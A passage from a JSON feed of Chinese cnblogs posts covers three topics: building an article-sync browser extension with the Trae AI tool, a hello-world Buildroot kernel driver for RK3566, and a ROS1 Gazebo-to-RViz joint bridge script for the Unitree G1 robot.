      "description": "<h1 class=\"postTitle\">\n\t\t\t<a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/chingho/p/19498962\" id=\"cb_post_title_url\" title=\"发布于 2026-01-18 19:02\">\n    <span>告别代码！我用Trae氛围编程的方式，开发了一款公众号文章同步插件！</span>\n    \n\n</a>\n\n\t\t</h1>\n\t\t<div class=\"clear\"></div>\n\t\t<div class=\"postBody\">\n\t\t\t    <div id=\"cnblogs_post_description\" style=\"display: none;\">\n        \n        大家好，我是编程乐趣。我利用周末时间，没有写任何一行代码，用Trae氛围编程的方式，完成一个浏览器插件的开发。最大的感受是，未来编程方式，对阅读代码、代码语法、编程语言等能力变得不再重要，懂得与AI对方才是最重要的能力。下面和大家分享下，我开发这款插件的完整过程与感受。该插件我已经在Github开源了，大家自行文末获取。一、插件产品介绍# 产品简介\n\n一个浏览器插件，用于在公众号文章页面自动显示同...\n    </div>\n<div class=\"blogpost-body blogpost-body-html\" id=\"cnblogs_post_body\">\n<p><span>大家好，我是编程乐趣。</span><span>我利用周末时间，<span>没有写任何一行代码，<span>用Trae氛围编程的方式，<span>完成一个浏览器插件的开发。</span></span></span></span><span><span>最大的感受是，未来编程方式，对阅读代码、代码语法、编程语言等能力变得不再重要，懂得与AI对方才是最重要的能力。</span></span><span>下面和大家分享下，我开发这款插件的完整过程与感受。</span></p>\n<p><strong>该插件我已经在Github开源了，大家自行文末获取。</strong></p>\n<p>&nbsp;</p>\n<p><strong>一、插件产品介绍</strong></p>\n<p><strong># 产品简介</strong></p>\n<p>一个浏览器插件，用于在公众号文章页面自动显示同步按钮，支持一键同步到多个平台。</p>\n<img alt=\"图片\" class=\"rich_pages wxw-img\" src=\"https://img2024.cnblogs.com/blog/93789/202601/93789-20260118190024657-790542621.png\" />\n<p><strong># 功能特性</strong></p>\n<p>-&nbsp;📤 在公众号文章页面自动注入同步按钮</p>\n<p>-&nbsp;🔄 支持一键同步到多个平台</p>\n<p>-&nbsp;✅ 支持平台勾选选择</p>\n<p>-&nbsp;🎨 美观易用的UI界面</p>\n<p><strong># 当前支持的平台</strong></p>\n<p>-&nbsp;📝 CSDN</p>\n<p>-&nbsp;🏫 博客园</p>\n<p>-&nbsp;🧠 知乎</p>\n<p>-&nbsp;📰 今日头条</p>\n<p><span>&nbsp;</span></p>\n<p><strong>二、开发完整步骤流程</strong></p>\n<p><span><span>由于开发过程中，没有截图，我只能通过文字来和大家分享。</span></span></p>\n<span><span>1、我告诉Trae，我要开发一款公众号文章同步浏览器插件，并罗列要支持的平台、需要完成的功能。</span></span><span><span>Trae：可以完整生成插件代码，同时会生成logo图片的配置信息。但没有生成logo图片。</span></span><img alt=\"图片\" class=\"rich_pages wxw-img\" src=\"https://img2024.cnblogs.com/blog/93789/202601/93789-20260118190024519-1701600050.png\" /><span><span>2、<span>我告诉Trae，帮我生成一个logo图片，用于做这个浏览器插件图标。这个产品我取名为：OneClick，<span>设计要求：<span>logo用产品名、绿色背景。</span></span></span></span></span><img alt=\"图片\" class=\"rich_pages wxw-img\" src=\"https://img2024.cnblogs.com/blog/93789/202601/93789-20260118190024555-1868309316.png\" /><span><span>Trae：<span><br /></span></span></span>\n<ul class=\"list-paddingleft-1\">\n<li><span>Trae会检测我电脑环境是否安装node，并使用node生成logo图片，但执行过程中发现我node版本过低，提示我要安装node相关插件。</span></li>\n<li><span>我电脑有安装多个node版本，Trae没有检测我电脑是否存在多个版本，直接提示我缺少相关插件，并给出<span>确认按钮，问我是否要安装插件，这边需要我人工点击确认。</span></span></li>\n<li><span><span>我点击确认后，Trade自动生成logo.svg文件，并根据要求生成不同尺寸的logo文件。</span></span></li>\n\n\n\n</ul>\n\n\n\n<span><br /></span><span><span>3、<span>完成以上步骤后，我把插件导入到Chrome浏览器，并尝试运行。<span>结果并不能完整运行。</span></span></span></span>\n<ul class=\"list-paddingleft-1\">\n<li><span>插件实现方式，打开不同标签页面，并自动填充标题、内容。有部分平台可以正确填充，有些不行。</span></li>\n\n\n\n</ul>\n\n\n\n<span><br /></span><span><span>4、<span>我告诉Trae，<span>不要使用打开不同标签页面的方式<span>，改为后台自动运行的方式。</span></span></span></span></span><span><span>Trae<span>：可以正确理解我要使用ApI的方式，并进行修改。</span></span></span><span><br /></span><span><span>5、完成修改后，我进行测试，依然是无法完成同步。</span></span><span><span>6、<span>接下去的几轮对话中，<span>我不断告诉Trae，同步功能有问题，插件界面有显示同步错误情况，我也把错误情况发送给Trae<span>，Trae也不断的进行代码修改，最终也是不能实现。</span></span></span></span></span><span><span>7、<span>我做了一个改变，查看浏览器的运行日志。并把更详细错误日志发送给Trae。Trae根据更详细日志，也修复几个Bug，但并不能完整实现同步功能。</span></span></span><span><span>8、<span>经过好几轮的对话，并不能实现我想要的功能，<span>我于是让Trae打印更详细的日志，方便我给她反馈<span>。Trae修改代码，并打印更详细的日志。</span></span></span></span></span><img alt=\"图片\" class=\"rich_pages wxw-img\" src=\"https://img2024.cnblogs.com/blog/93789/202601/93789-20260118190024519-743493286.webp\" /><span><span>9<span>、继续经过好几轮对话，还是不能正确实现功能。通过日志查看，Trae提交的API，并不是正确的。<span>这个是由于各个平台，并没有公开的API文档<span>，所以Trae是通过搜索网络文档和猜测的方式，不断修改代码。</span></span></span></span></span><span><span>10、<span>由于不能实现功能，我只能是到各个平台，手动操作保存文章草稿，并通过浏览器插件，提取相关的接口Url、请求标头、提交报文等信息。</span></span></span>\n<ul class=\"list-paddingleft-1\">\n<li><span>有些平台支持markdown、有些只能是富文本形式。</span></li>\n<li><span>提取图片上传接口、保存草稿的接口的相关报文。</span></li>\n\n\n\n</ul>\n<p>\n\n<span><br /></span><img alt=\"图片\" class=\"rich_pages wxw-img\" src=\"https://img2024.cnblogs.com/blog/93789/202601/93789-20260118190024613-576081230.webp\" /><span><span>11<span>、通过我给的报文，插件可以正确提交，但都提示未登录、或者没权限。我告诉Trae，分别先访问各个平台后台（我整理各个平台后台Url），并获取Cookie并由于接口提交。</span></span></span><span><span>12<span>、通过以上的方式，并结合打印的日志，我不同让Trae调整，最终完整实现功能。</span></span></span><span><br /></span></p>\n<p><strong><span>三、开发总结</span></strong></p>\n<p><span><span>1、在这过程中，我没有手动<span>编写任何一行代码<span>。</span></span></span></span></p>\n<p><span><span>2、不再需要阅读代码，<span>只要把错误日志反馈给AI，AI就能正确的修改<span>。</span></span></span></span></p>\n<p><span><span>3、过程中，一直无法实现功能，<span>记得要求AI打印更详细的日志<span>，<span>方便我们给AI反馈。</span></span></span></span></span></p>\n<p><span><span>4、虽然不用编写代码、阅读代码，但<span>对实现原理还要知道的<span>。否则，我就不懂通过查看浏览器报文的形式，给AI反馈了。</span></span></span></span></p>\n<p><span><span>最后<span>，现在对程序员的要求已经完全变了。代码语法、代码规范、编程语言等过去要求的能力，变得越来越不重要了。</span></span></span><span><span>你只需懂得各种原理、各种知识点的概念，就能实现开发了。</span></span></p>\n<p><span><br /></span><strong>四、插件下载</strong></p>\n<p><span><span>代码我已经提交到Github，大家可以自行下载，或者网盘下载。</span></span></p>\n<p><span><span>开源项目：<span><br /></span></span></span><span>https://github.com/bianchenglequ/OneClick</span></p>\n<p><span><span>网盘下载：<span><br /></span></span></span><span>https://pan.quark.cn/s/9ef2717f5203</span></p>\n</div>\n<div class=\"clear\"></div>\n\n\t\t</div>\n\t\t<div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-18 19:02</span>&nbsp;\n<a href=\"https://www.cnblogs.com/chingho\">chingho</a>&nbsp;\n阅读(<span id=\"post_view_count\">108</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "编写一个Buildroot 内核驱动",
      "link": "https://www.cnblogs.com/tianwuyvlianshui/p/19498842",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/tianwuyvlianshui/p/19498842\" id=\"cb_post_title_url\" title=\"发布于 2026-01-18 17:40\">\n    <span>编写一个Buildroot 内核驱动</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<h1 id=\"编写一个buildroot-内核驱动\">编写一个Buildroot 内核驱动</h1>\n<blockquote>\n<p>PS:内核驱动只能在<strong>/kernel/drivers/</strong>目录下</p>\n</blockquote>\n<p><img alt=\"image-20260117082757215\" src=\"https://img2024.cnblogs.com/blog/3281938/202601/3281938-20260118173751023-892940144.png\" /></p>\n<h2 id=\"makefile文件的编写\">Makefile文件的编写</h2>\n<blockquote>\n<p>主要注意Makefile文件的编写（路径，包含）</p>\n<p>在该路径下先新建一个用户内核驱动文件夹，用于存放用户编写的驱动</p>\n<p><strong>user_rk3566_-kernel-driver</strong></p>\n<p>进入该文件夹，新建一个02序号用户驱动文件夹，用于存放02驱动</p>\n<p><strong>02_kernel_helloworld</strong></p>\n<p>编写kernel/drivers/user_rk3566_-kernel-driver/02_kernel_helloworld路径下的Makefile（添加驱动源文件<strong>02_kernel_helloworld.c</strong>进编译）</p>\n<pre><code>vim Makefile\n</code></pre>\n<p>Makefile：</p>\n<pre><code>#obj-y :内核驱动\n#obj-m :模块驱动\nobj-y += 02_hello_world.o\n</code></pre>\n<p>返回到<strong>kernel/drivers/user_rk3566_-kernel-driver</strong>路径，添加Makefile（添加驱动源文件的文件夹<strong>02_kernel_helloworld/</strong>进编译）</p>\n<p>Makefile：</p>\n<pre><code>#添加驱动文件所在文件夹进编译，需要带“/”符号，表示目录（文件夹）\nobj-y += 02_kernel_helloworld/\n</code></pre>\n<p>返回到<strong>kernel/drivers</strong>路径，添加Makefile（添加驱动源文件的文件夹user_rk3566_-kernel-driver/进编译）</p>\n<p>Makefile：</p>\n<pre><code>obj-y +=/user_rk3566_-kernel-driver/\n</code></pre>\n<p>随便找个地方，把文件夹路径丢进去</p>\n</blockquote>\n<img alt=\"image-20260118171936747\" src=\"https://img2024.cnblogs.com/blog/3281938/202601/3281938-20260118173754308-308553245.png\" />\n<blockquote>\n<p>OK,由于SDK路径的Makefile文件已经将kernel/drivers路径添加，我们就不需要自己手动添加</p>\n<p>以上就是所需要添加的Makefile文件。</p>\n<p>主要目的是告诉make工具在<strong>kernel/drivers/user_rk3566_-kernel-driver/02_kernel_helloworld</strong>路径下是我们的驱动源代码<strong>02_kernel_helloworld.c</strong>，需要添加进编译</p>\n</blockquote>\n<h2 id=\"驱动文件编写\">驱动文件编写</h2>\n<blockquote>\n<p>进入该02_kernel_helloworld，开始驱动编写</p>\n<pre><code>vim 02_hello_world.c \n</code></pre>\n<p>02_hello_world.c</p>\n<pre><code class=\"language-c\">#include &lt;linux/module.h&gt;     /* 模块相关宏和函数 */\n#include &lt;linux/kernel.h&gt;     /* printk日志函数 */\n\n/* 加载函数（驱动入口），当驱动被 insmod 加载时自动执行 */\nstatic int __init helloworld_init(void)\n{\n    printk(\"02_helloworld_init\\r\\n\"); // 内核日志打印\n    return 0; // 返回0代表加载成功\n}\n\n/* 卸载函数（驱动出口），当驱动被 rmmod 卸载时自动执行 */\nstatic void __exit helloworld_exit(void)\n{\n    printk(\"02_helloworld_exit\\r\\n\");\n}\n\n/* 下面这两行，告诉内核入口和出口分别是哪两个函数 */\nmodule_init(helloworld_init);\nmodule_exit(helloworld_exit);\n\n/* 这3个是模块信息声明 */\nMODULE_LICENSE(\"GPL v2\");               /* 模块许可证 */\n\n</code></pre>\n</blockquote>\n<h2 id=\"编译\">编译</h2>\n<p>我们需要返回到kernel内核文件夹的上一个路径</p>\n<p>在我这是SDK/，这里包含了编译脚本，须在这里运行编译命令</p>\n<pre><code>./build.sh kernel\n</code></pre>\n<p><img alt=\"image-20260118172404378\" src=\"https://img2024.cnblogs.com/blog/3281938/202601/3281938-20260118173751745-1600325666.png\" /></p>\n<p>编译成功</p>\n<p><img alt=\"image-20260118172442489\" src=\"https://img2024.cnblogs.com/blog/3281938/202601/3281938-20260118173752421-1683639729.png\" /></p>\n<p>返回源代码路径查看编译文件（可选）</p>\n<p><img alt=\"image-20260118163216910\" src=\"https://img2024.cnblogs.com/blog/3281938/202601/3281938-20260118173752940-2085711302.png\" /></p>\n<p>可以看到，内核驱动编译后，不会像模块驱动那样生成<strong>.ko</strong>文件</p>\n<p>实际，驱动相关的内容已经编译进内核镜像中（root.img）</p>\n<p><img alt=\"image-20260118172723586\" src=\"https://img2024.cnblogs.com/blog/3281938/202601/3281938-20260118173753283-1927509773.png\" /></p>\n<h2 id=\"运行\">运行</h2>\n<p>将该镜像烧录，等板子运行后查看日志</p>\n<pre><code>dmesg | grep -E hello\n</code></pre>\n<p><img alt=\"image-20260118173111518\" src=\"https://img2024.cnblogs.com/blog/3281938/202601/3281938-20260118173753691-118600053.png\" /></p>\n<p>可以看到驱动上电后自动运行，这就是和模块驱动的一个显著区别，不需要手动挂载</p>\n<p>修改完后，git提交一下代码更改（可选）</p>\n<pre><code>git add .\ngit commit -m\"修改说明\"\ngit pull\ngit push\n</code></pre>\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-18 17:40</span>&nbsp;\n<a href=\"https://www.cnblogs.com/tianwuyvlianshui\">沁拒离</a>&nbsp;\n阅读(<span id=\"post_view_count\">44</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "ROS1 noetic 中将 Unitree G1 基于 Gazebo/RViz 关节联动【基于 Gazebo 状态反馈】",
      "link": "https://www.cnblogs.com/zylyehuo/p/19498596",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/zylyehuo/p/19498596\" id=\"cb_post_title_url\" title=\"发布于 2026-01-18 15:37\">\n    <span>ROS1 noetic 中将 Unitree G1 基于 Gazebo/RViz 关节联动【基于 Gazebo 状态反馈】</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<blockquote>\n<p>博客地址：<a href=\"https://www.cnblogs.com/zylyehuo/\" target=\"_blank\">https://www.cnblogs.com/zylyehuo/</a></p>\n</blockquote>\n<blockquote>\n<p><a href=\"https://github.com/unitreerobotics/unitree_ros/tree/master/robots/g1_description\" rel=\"noopener nofollow\" target=\"_blank\">Unitree G1 模型文件下载地址(挑选自己需要的部分，本教程基于 g1_29dof.urdf (以及 .xml 和 meshes 文件夹))</a></p>\n</blockquote>\n<blockquote>\n<p>有核心的 URDF 文件和 Meshes (STL 网格文件)</p>\n</blockquote>\n<p><img alt=\"image\" src=\"https://img2024.cnblogs.com/blog/3071480/202601/3071480-20260113204337327-270675226.png\" /></p>\n<blockquote>\n<p>为 Gazebo 中模型添加颜色参考：<a href=\"https://www.cnblogs.com/zylyehuo/p/19479129\" target=\"_blank\">ROS1 noetic 中将 Unitree G1 的 URDF 导入 Gazebo/RViz</a></p>\n</blockquote>\n<blockquote>\n<p>并非基于传统的 ros_control（通过插件控制关节），而是通过 Gazebo 状态反馈 -&gt; 计算位姿 -&gt; 映射到 TF 和 JointState 的方式实现的。</p>\n</blockquote>\n<ul>\n<li>该系统跳过了 ros_control 控制器。</li>\n<li>向 /joint_commands 发送 JointState 消息时，脚本会调用 Gazebo 的 /gazebo/set_model_configuration 服务。</li>\n<li>这个服务直接“强行”设置 Gazebo 中物理模型的关节位置，类似于瞬移，而不是施加力矩。在调试规划算法时非常高效。</li>\n</ul>\n<h1 id=\"效果预览\">效果预览</h1>\n<p><img alt=\"image\" src=\"https://img2024.cnblogs.com/blog/3071480/202601/3071480-20260118152755660-1755629437.png\" /></p>\n<h1 id=\"工作空间结构\">工作空间结构</h1>\n<p><img alt=\"image\" src=\"https://img2024.cnblogs.com/blog/3071480/202601/3071480-20260118161444336-1800514403.png\" /></p>\n<h1 id=\"主要文件\">主要文件</h1>\n<h2 id=\"display_and_gazebolaunch\">display_and_gazebo.launch</h2>\n<pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;launch&gt;\n  &lt;!-- 加载机器人URDF模型参数 --&gt;\n  &lt;param name=\"robot_description\" textfile=\"$(find g1_description)/urdf/g1_29dof.urdf\" /&gt;\n\n  &lt;!-- TF静态变换 --&gt;\n  &lt;node pkg=\"tf\" type=\"static_transform_publisher\" name=\"world_to_map\" args=\"0 0 0  0 0 0 1  world map 10\"/&gt;\n  &lt;!-- NOTE: removed static base_link-&gt;pelvis to avoid TF duplication; link_states_bridge publishes dynamic map-&gt;base_link --&gt;\n  &lt;node pkg=\"tf\" type=\"static_transform_publisher\" name=\"imu_in_torso2body_imu\" args=\"0.0  0.0  0.0   0.0 0.0 0.0 1  imu_in_torso body_imu 100\" /&gt;\n  &lt;!-- NOTE: keep base_link-&gt;pelvis as a static zero transform so pelvis and base_link coincide --&gt;\n  &lt;node pkg=\"tf\" type=\"static_transform_publisher\" name=\"base_link2pelvis\" args=\"0 0 0  0 0 0 1  base_link pelvis 100\" /&gt;\n\n  &lt;!-- 机器人状态发布器 --&gt;\n  &lt;node name=\"robot_state_publisher\" pkg=\"robot_state_publisher\" type=\"robot_state_publisher\" /&gt;\n\n  &lt;!-- LinkStates到JointState的桥接，同时发布动态TF和处理关节命令 --&gt;\n  &lt;node name=\"link_states_bridge\" pkg=\"g1_description\" type=\"link_states_bridge.py\" output=\"screen\" /&gt;\n\n  &lt;!-- RViz --&gt;\n  &lt;node name=\"rviz\" pkg=\"rviz\" type=\"rviz\" respawn=\"false\" output=\"screen\" /&gt;\n\n  &lt;!-- ============ Gazebo配置 ============ --&gt;\n  &lt;!-- 启动Gazebo --&gt;\n  &lt;include file=\"$(find gazebo_ros)/launch/empty_world.launch\"&gt;\n    &lt;arg name=\"paused\" value=\"false\"/&gt;\n    &lt;arg name=\"use_sim_time\" value=\"true\"/&gt;\n    &lt;arg name=\"gui\" value=\"true\"/&gt;\n    &lt;arg name=\"headless\" value=\"false\"/&gt;\n  &lt;/include&gt;\n\n  &lt;!-- 将机器人模型生成到Gazebo中 --&gt;\n  &lt;node name=\"spawn_urdf\" pkg=\"gazebo_ros\" type=\"spawn_model\" \n    args=\"-param robot_description -urdf -z 0.79 -model g1_robot\" \n    output=\"screen\" /&gt;\n\n  &lt;!-- NOTE: controller parameters loading removed to avoid conflicts; using bridge(set_model_configuration) instead --&gt;\n\n&lt;/launch&gt;\n\n</code></pre>\n<h2 id=\"link_states_bridgepy\">link_states_bridge.py</h2>\n<pre><code class=\"language-python\">#!/usr/bin/env python3\n\nimport rospy\nimport math\nfrom gazebo_msgs.msg import LinkStates\nfrom sensor_msgs.msg import JointState\nfrom std_msgs.msg import Float64\nimport numpy as np\nfrom scipy.spatial.transform import Rotation\nimport threading\nimport tf\nfrom geometry_msgs.msg import TransformStamped\nfrom gazebo_msgs.srv import SetModelConfiguration\n\nclass LinkStatesToJointState:\n    def __init__(self):\n        rospy.init_node('link_states_to_joint_state')\n        \n        # 订阅Gazebo的链接状态\n        self.link_states_sub = rospy.Subscriber('/gazebo/link_states', LinkStates, self.link_states_callback, queue_size=1)\n        \n        # 订阅关节命令话题（用于控制Gazebo中的关节）\n        self.joint_cmd_sub = rospy.Subscriber('/joint_commands', JointState, self.joint_cmd_callback, queue_size=1)\n        \n        # 发布joint_states\n        self.joint_states_pub = rospy.Publisher('/joint_states', JointState, queue_size=1)\n        \n        # 发布TF变换\n        self.tf_broadcaster = tf.TransformBroadcaster()\n        \n        # 所有关节及其parent/child链接映射\n        self.joints_info = {\n            'left_hip_pitch_joint': ('pelvis', 'left_hip_pitch_link', [0, 1, 0]),\n            'left_hip_roll_joint': ('left_hip_pitch_link', 'left_hip_roll_link', [1, 0, 0]),\n            'left_hip_yaw_joint': ('left_hip_roll_link', 'left_hip_yaw_link', [0, 0, 1]),\n            'left_knee_joint': ('left_hip_yaw_link', 'left_knee_link', [0, 1, 0]),\n            'left_ankle_pitch_joint': ('left_knee_link', 'left_ankle_pitch_link', [0, 1, 0]),\n            'left_ankle_roll_joint': ('left_ankle_pitch_link', 'left_ankle_roll_link', [1, 0, 0]),\n            'right_hip_pitch_joint': ('pelvis', 'right_hip_pitch_link', [0, 1, 0]),\n            'right_hip_roll_joint': ('right_hip_pitch_link', 'right_hip_roll_link', [1, 0, 0]),\n            'right_hip_yaw_joint': ('right_hip_roll_link', 'right_hip_yaw_link', [0, 0, 1]),\n            'right_knee_joint': ('right_hip_yaw_link', 'right_knee_link', [0, 1, 0]),\n            'right_ankle_pitch_joint': ('right_knee_link', 'right_ankle_pitch_link', [0, 1, 0]),\n            'right_ankle_roll_joint': ('right_ankle_pitch_link', 'right_ankle_roll_link', [1, 0, 0]),\n            'waist_yaw_joint': ('pelvis', 'waist_yaw_link', [0, 0, 1]),\n            'waist_roll_joint': ('waist_yaw_link', 'waist_roll_link', [1, 0, 0]),\n            'waist_pitch_joint': ('waist_roll_link', 'torso_link', [0, 1, 0]),\n            'left_shoulder_pitch_joint': ('torso_link', 'left_shoulder_pitch_link', [0, 1, 0]),\n            'left_shoulder_roll_joint': ('left_shoulder_pitch_link', 'left_shoulder_roll_link', [1, 0, 0]),\n            'left_shoulder_yaw_joint': ('left_shoulder_roll_link', 'left_shoulder_yaw_link', [0, 0, 1]),\n            'left_elbow_joint': ('left_shoulder_yaw_link', 'left_elbow_link', [0, 1, 0]),\n            'left_wrist_roll_joint': ('left_elbow_link', 'left_wrist_roll_link', [1, 0, 0]),\n            'left_wrist_pitch_joint': ('left_wrist_roll_link', 'left_wrist_pitch_link', [0, 1, 0]),\n            'left_wrist_yaw_joint': ('left_wrist_pitch_link', 'left_wrist_yaw_link', [0, 0, 1]),\n            'right_shoulder_pitch_joint': ('torso_link', 'right_shoulder_pitch_link', [0, 1, 0]),\n            'right_shoulder_roll_joint': ('right_shoulder_pitch_link', 'right_shoulder_roll_link', [1, 0, 0]),\n            'right_shoulder_yaw_joint': ('right_shoulder_roll_link', 'right_shoulder_yaw_link', [0, 0, 1]),\n            'right_elbow_joint': ('right_shoulder_yaw_link', 'right_elbow_link', [0, 1, 0]),\n            'right_wrist_roll_joint': ('right_elbow_link', 'right_wrist_roll_link', [1, 0, 0]),\n            'right_wrist_pitch_joint': ('right_wrist_roll_link', 'right_wrist_pitch_link', [0, 1, 0]),\n            'right_wrist_yaw_joint': ('right_wrist_pitch_link', 'right_wrist_yaw_link', [0, 0, 1]),\n        }\n        \n        # Gazebo set_model_configuration 服务代理（用于直接设置关节位置，替代ros_control）\n        rospy.wait_for_service('/gazebo/set_model_configuration')\n        self.set_model_config = rospy.ServiceProxy('/gazebo/set_model_configuration', SetModelConfiguration)\n        \n        self.last_msg = None\n        self.lock = threading.Lock()\n        self.initial_pelvis_z = None  # 初始pelvis高度\n\n        # TF 发布节流参数\n        self.last_tf_time = rospy.Time(0)\n        self.tf_min_interval = rospy.Duration(0.05)  # 最小间隔 50ms\n        self.last_pelvis_pose = None\n        self.tf_pos_thresh = 0.005   # 5mm\n        self.tf_rot_thresh = 0.01    # ~0.57deg\n        \n        rospy.loginfo(\"Link States to Joint State Bridge initialized\")\n        rospy.loginfo(\"Now using /gazebo/set_model_configuration to apply joint commands\")\n        rospy.loginfo(\"Publish JointState to /joint_commands to control joints\")\n    \n    def link_states_callback(self, msg):\n        with self.lock:\n            self.last_msg = msg\n            self.publish_joint_states(msg)\n            self.publish_dynamic_tf(msg)\n    \n    def joint_cmd_callback(self, msg):\n        \"\"\"订阅关节命令话题，使用Gazebo服务设置关节位置（不依赖URDF transmission）\"\"\"\n        try:\n            if not msg.name or not msg.position:\n                rospy.logwarn(\"Received empty joint command\")\n                return\n            # 调用服务设置关节位置\n            model_name = 'g1_robot'\n            urdf_param_name = 'robot_description'\n            joint_names = list(msg.name)\n            joint_positions = list(msg.position)\n            rospy.loginfo(f\"Setting joints via service: {joint_names} -&gt; {joint_positions}\")\n            self.set_model_config(model_name, urdf_param_name, joint_names, joint_positions)\n        except Exception as e:\n            rospy.logerr(f\"Failed to call set_model_configuration: {e}\")\n    \n    def get_link_index(self, link_name, msg):\n        \"\"\"获取链接在LinkStates中的索引\"\"\"\n        full_name = f'g1_robot::{link_name}'\n        try:\n            return msg.name.index(full_name)\n        except ValueError:\n            return -1\n    \n    def get_relative_rotation(self, parent_pose, child_pose):\n        \"\"\"计算从parent到child的相对旋转（四元数）\"\"\"\n        p_quat = [parent_pose.orientation.x, parent_pose.orientation.y, \n                  parent_pose.orientation.z, parent_pose.orientation.w]\n        c_quat = [child_pose.orientation.x, child_pose.orientation.y, \n                  child_pose.orientation.z, child_pose.orientation.w]\n        \n        p_rot = Rotation.from_quat(p_quat)\n        c_rot = Rotation.from_quat(c_quat)\n        \n        rel_rot = p_rot.inv() * c_rot\n        \n        return rel_rot\n    \n    def rotation_to_angle_around_axis(self, rotation, axis):\n        angle = rotation.magnitude()\n        \n        if abs(angle) &lt; 1e-6:\n            return 0.0\n        \n        rotvec = rotation.as_rotvec()\n        rot_axis = rotvec / angle if angle &gt; 1e-6 else [0, 0, 1]\n        \n        axis_norm = np.array(axis) / np.linalg.norm(axis)\n        \n        if np.dot(rot_axis, axis_norm) &gt; 0.9:\n            return angle\n        elif np.dot(rot_axis, axis_norm) &lt; -0.9:\n            return -angle\n        else:\n            euler = rotation.as_euler('xyz')\n            if axis == [1, 0, 0]:\n                return euler[0]\n            elif axis == [0, 1, 0]:\n                return euler[1]\n            elif axis == [0, 0, 1]:\n                return euler[2]\n            else:\n                return 0.0\n    \n    def publish_joint_states(self, msg):\n        joint_state = JointState()\n        joint_state.header.stamp = rospy.Time.now()\n        joint_state.name = list(self.joints_info.keys())\n        joint_state.position = []\n        joint_state.velocity = [0.0] * len(joint_state.name)\n        joint_state.effort = [0.0] * len(joint_state.name)\n        \n        for joint_name, (parent_name, child_name, axis) in self.joints_info.items():\n            parent_idx = self.get_link_index(parent_name, msg)\n            child_idx = self.get_link_index(child_name, msg)\n            \n            if parent_idx &lt; 0 or child_idx &lt; 0:\n                joint_state.position.append(0.0)\n                continue\n            \n            rel_rot = self.get_relative_rotation(msg.pose[parent_idx], msg.pose[child_idx])\n            angle = self.rotation_to_angle_around_axis(rel_rot, axis)\n            \n            joint_state.position.append(angle)\n        \n        self.joint_states_pub.publish(joint_state)\n    \n    def publish_dynamic_tf(self, msg):\n        pelvis_idx = self.get_link_index('pelvis', msg)\n\n        if pelvis_idx &lt; 0:\n            return\n\n        pelvis_pose = msg.pose[pelvis_idx]\n\n        # 节流逻辑\n        now = rospy.Time.now()\n        if self.last_pelvis_pose is not None:\n            pos_diff = np.linalg.norm([\n                pelvis_pose.position.x - self.last_pelvis_pose.position.x,\n                pelvis_pose.position.y - self.last_pelvis_pose.position.y,\n                pelvis_pose.position.z - self.last_pelvis_pose.position.z\n            ])\n            rot_diff = Rotation.from_quat([\n                pelvis_pose.orientation.x, pelvis_pose.orientation.y,\n                pelvis_pose.orientation.z, pelvis_pose.orientation.w\n            ]).inv() * Rotation.from_quat([\n                self.last_pelvis_pose.orientation.x, self.last_pelvis_pose.orientation.y,\n                self.last_pelvis_pose.orientation.z, self.last_pelvis_pose.orientation.w\n            ])\n            rot_diff_angle = rot_diff.magnitude()\n\n            if pos_diff &lt; self.tf_pos_thresh and rot_diff_angle &lt; self.tf_rot_thresh and (now - self.last_tf_time) &lt; self.tf_min_interval:\n                return\n\n        self.last_tf_time = now\n        self.last_pelvis_pose = pelvis_pose\n\n        translation = (pelvis_pose.position.x, pelvis_pose.position.y, pelvis_pose.position.z)\n        rotation_q = (pelvis_pose.orientation.x, pelvis_pose.orientation.y, pelvis_pose.orientation.z, pelvis_pose.orientation.w)\n\n        # 只发布 map -&gt; base_link，让 base_link-&gt;pelvis 由静态发布器（launch）处理\n        self.tf_broadcaster.sendTransform(\n            translation=translation,\n            rotation=rotation_q,\n            time=rospy.Time.now(),\n            child='base_link',\n            parent='map'\n        )\n\nif __name__ == '__main__':\n    try:\n        node = LinkStatesToJointState()\n        rospy.spin()\n    except rospy.ROSInterruptException:\n        pass\n\n</code></pre>\n<h1 id=\"运行步骤\">运行步骤</h1>\n<pre><code>cd ~/g1_test_ws\n</code></pre>\n<pre><code>catkin_make\n</code></pre>\n<pre><code>source ./devel/setup.bash\n</code></pre>\n<pre><code>roslaunch g1_description display_and_gazebo.launch\n</code></pre>\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-18 15:37</span>&nbsp;\n<a href=\"https://www.cnblogs.com/zylyehuo\">zylyehuo</a>&nbsp;\n阅读(<span id=\"post_view_count\">29</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    }
  ]
}